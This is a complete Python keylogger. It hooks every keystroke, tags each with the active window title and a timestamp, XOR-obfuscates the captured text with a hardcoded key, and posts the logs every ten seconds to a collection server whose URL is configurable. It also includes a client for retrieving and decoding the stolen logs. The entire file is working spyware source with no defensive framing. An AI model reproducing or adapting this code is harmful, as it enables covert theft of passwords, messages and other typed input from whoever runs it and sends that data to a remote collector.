from datetime import datetime
import keyboard
import pygetwindow as gw
import binascii
import requests
import json
import time
from threading import Thread


class KeyLoggerService:
    def __init__(self, server_sender, cipher):
        self.server_sender = server_sender
        self.cipher = cipher
        self.data_to_send = {}

    def on_press(self, event):
        window = gw.getActiveWindow()
        window = window.title if window else "Unknown Window"
        timestamp = datetime.now().strftime("%d/%m/%y %H:%M")
        key = self._format_key(event.name)
        encrypted_key = self.cipher.encrypt(key)

        if window not in self.data_to_send:
            self.data_to_send[window] = {}

        if timestamp not in self.data_to_send[window]:
            self.data_to_send[window][timestamp] = ""

        self.data_to_send[window][timestamp] += encrypted_key

    def start_sending_data(self):
        while True:
            if self.data_to_send:
                self.server_sender.send_data(self.data_to_send)
                print("Data sent to server.")
                self.data_to_send = {}
            time.sleep(10)

    def _format_key(self, key_name):
        if key_name == "enter":
            return " \n "
        elif key_name == "space":
            return " "
        elif len(key_name) > 1:
            return f" [{key_name}] "
        return key_name


class XorCipher:
    def __init__(self, key="thisIsMyXorKey"):
        self.key = key

    def encrypt(self, text):
        return binascii.hexlify(self._xor_process(text).encode()).decode()

    def decrypt(self, text):
        return self._xor_process(binascii.unhexlify(text).decode())

    def _xor_process(self, text):
        key_cycle = (self.key * ((len(text) // len(self.key)) + 1))[:len(text)]
        return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key_cycle))


class ServerSender:
    def __init__(self, server_url="http://127.0.0.1:5000/data"):
        self.server_url = server_url

    def get_data(self):
        try:
            response = requests.get(self.server_url)
            if response.status_code == 200:
                data = response.json()

                combined_data = {}
                for entry in data:
                    combined_data.update(entry)

                return combined_data
            else:
                print(f"Failed to get data: {response.status_code}, {response.text}")
                return {}
        except Exception as e:
            print(f"Error getting data: {e}")
            return {}

    def send_data(self, data):
        try:
            response = requests.post(self.server_url, json=data)
            if response.status_code == 201:
                print("Data sent successfully!")
            else:
                print(f"Failed to send data: {response.status_code}, {response.text}")
        except Exception as e:
            print(f"Error sending data: {e}")


if __name__ == "__main__":
    server_sender = ServerSender()
    xor_cipher = XorCipher()
    key_logger = KeyLoggerService(server_sender, xor_cipher)

    keyboard.on_press(key_logger.on_press)

    send_thread = Thread(target=key_logger.start_sending_data)
    send_thread.daemon = True
    send_thread.start()
    keyboard.wait()